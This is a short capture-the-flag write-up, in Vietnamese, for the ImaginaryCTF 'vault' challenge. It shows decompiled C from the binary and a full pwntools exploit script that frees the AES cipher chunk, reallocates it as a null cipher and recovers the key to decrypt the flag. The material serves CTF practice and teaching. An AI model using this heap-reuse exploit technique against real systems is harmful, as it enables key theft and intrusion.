# vault
## Phân tích
- Một bài khái thác 1 chút lỗi của pwn và crypto =((
- Đầu tiên chương trình random một key
```c
int sub_1DE9()
{
  FILE *stream; // [rsp+0h] [rbp-10h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  ptr = malloc(0x18uLL);
  *(_QWORD *)ptr = 0LL;
  stream = fopen("/dev/urandom", "rb");
  if ( !stream )
    _exit(-1);
  if ( fread((char *)ptr + 8, 1uLL, 0x10uLL, stream) <= 0xF )
    _exit(-1);
  return fclose(stream);
}
```
- Hàm main sau
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  start();
  puts(asc_43B8);
  puts("Select an option:");
  puts("1. Create cipher");
  puts("2. Delete cipher");
  puts("3. Create secret");
  puts("4. Delete secret");
  puts("5. View encrypted secret");
  puts("6. Encrypt flag");
  puts("7. Exit");
  while ( 1 )
  {
    printf(off_465B, a2);
    a2 = (char **)&v3;
    __isoc99_scanf("%d%*c", &v3);
    switch ( v3 )
    {
      case 1:
        sub_1605();
        break;
      case 2:
        sub_1801();
        break;
      case 3:
        sub_1926();
        break;
      case 4:
        sub_1AA1();
        break;
      case 5:
        sub_1BCC();
        break;
      case 6:
        sub_1CBD();
        break;
      case 7:
        _exit(0);
      default:
        puts("Invalid choice.");
        break;
    }
  }
}
```
- Thì ý tưởng là xoá chunk aes sau đó malloc nó bằng `NOP` (set 8 byte null)
- Sau đó ta tạo `secret` và xem sau khi decrypt ta lấy để tìm ra key (vì flag có vẻ như dùng key này để encrypt)
## script
```python
#!/usr/bin/env python3
import os
from pwn import *

def start():
    global p

    if args.REMOTE:
        p = remote("vault.chal.imaginaryctf.org", 1337)
    else:
        p = elf.process()

def gdb_attach():
    if args.NOGDB or args.REMOTE:
        return
    
    gdb.attach(p, '''
    continue
    ''')

    input('ATTACHED?')

def sendchoice(choice: int):
    p.sendlineafter("> ", str(choice))

def create_cipher(cipher: int, additional: bytes = None):
    sendchoice(1)
    p.sendlineafter(': ', str(cipher))

    if additional:
        p.sendlineafter(": ", additional)

def delete_cipher(cipher: int):
    sendchoice(2)
    p.sendlineafter(': ', str(cipher))

def create_secret(index: int, secret: bytes, cipher: int):
    sendchoice(3)
    p.sendlineafter(": ", str(index))
    p.sendlineafter(": ", secret)
    p.sendlineafter(": ", str(cipher))

def view_secret(index: int):
    sendchoice(5)
    p.sendlineafter(": ", str(index))

def encrypt_flag():
    sendchoice(6)
    p.sendlineafter(": ", "0")

context.binary = elf = ELF("./vuln")
libc = elf.libc

plaintext = (b'stdnoerr'*(0x40//8))[:-1]

with open("plain.txt", "wb+") as fp:
    fp.write(plaintext)

start()

delete_cipher(0)
create_cipher(2)
create_secret(0, plaintext, 0)
view_secret(0)

ciphertext = bytes.fromhex(b''.join(p.recvline(False).split()).decode())

with open("cipher.txt", "wb+") as fp:
    fp.write(ciphertext)

os.system("./aes A")

with open("IV.txt", "rb") as fp:
    IV = fp.read()

print(IV)

encrypt_flag()
view_secret(0)
ciphertext = bytes.fromhex(b''.join(p.recvline(False).split()).decode())

with open("cipher.txt", "wb+") as fp:
    fp.write(ciphertext)

os.system("./aes B")

with open("plain.txt", "rb") as fp:
    flag = fp.read()

print(flag)

gdb_attach()

p.interactive()
p.close()
```